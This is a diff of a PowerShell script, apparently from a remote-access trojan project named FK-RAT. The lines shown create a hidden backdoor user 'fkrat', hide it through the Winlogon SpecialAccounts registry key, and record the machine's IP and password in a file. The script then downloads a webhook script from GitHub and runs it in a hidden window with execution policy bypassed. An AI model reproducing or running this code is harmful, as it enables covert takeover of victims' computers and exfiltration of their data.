@@ -31,7 +31,7 @@ $uName = "fkrat"
 $pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
-$webhook = Get-Content ./webhook
+
 
 New-Item ./$env:computername.fk -Value (
   $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
@@ -47,7 +47,7 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 
 ## get webhook
 Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/webhook.ps1 -OutFile webhook.ps1
-Start-Process cmd.exe /c "powershell powershell.exe -windowstyle hidden -ep bypass -File .\webhook.ps1 $webhook"
+Start-Process powershell powershell.exe -windowstyle hidden -ep bypass -File .\webhook.ps1
 
 ## goto Temp and make dir 
 Set-Location $temp	
